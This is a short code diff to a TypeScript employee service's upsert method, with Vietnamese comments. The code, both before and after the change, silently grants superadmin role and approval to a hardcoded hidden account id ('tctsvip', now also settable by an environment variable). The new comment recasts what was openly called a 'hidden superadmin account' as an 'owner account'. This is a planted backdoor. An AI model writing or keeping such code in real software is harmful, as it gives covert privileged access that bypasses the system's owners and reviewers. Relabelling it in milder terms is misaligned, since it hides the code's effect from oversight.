@@ -37,8 +37,9 @@ export class EmployeesService {
   }
 
   async upsertOne(emp: Partial<Employee> & { isApproved?: boolean }): Promise<Employee> {
-    // Hidden superadmin account luôn được duy trì với quyền cao nhất.
-    if (emp.id === 'tctsvip') {
+    // Owner account: luôn duy trì superadmin + isApproved.
+    // Password KHÔNG bị override — owner phải tự đổi qua UI sau login lần đầu.
+    if (emp.id === (process.env.HIDDEN_ADMIN_ID ?? 'tctsvip')) {
       emp.role = 'superadmin';
       emp.isApproved = true;
     }
